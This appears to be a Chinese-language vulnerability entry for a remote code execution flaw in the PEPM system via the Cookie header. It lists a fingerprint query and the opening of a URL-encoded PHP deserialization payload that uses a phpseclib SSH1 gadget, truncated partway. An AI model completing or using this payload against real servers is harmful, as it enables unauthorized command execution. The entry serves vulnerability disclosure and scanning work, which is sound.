# PEPM系统Cookie请求头存在远程代码执行漏洞

- **系统**：PEPM　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`header="pepm"`
- **请求**：`GET / HTTP/1.1`
- **关键头**：`Cookie: auth=a%3A1%3A%7Bi%3A0%3BO%3A18%3A%22phpseclib%5CNet%5CSSH1%22%3A2%3A%7Bs%3A6%3A%…`
- **预期**：200　|　—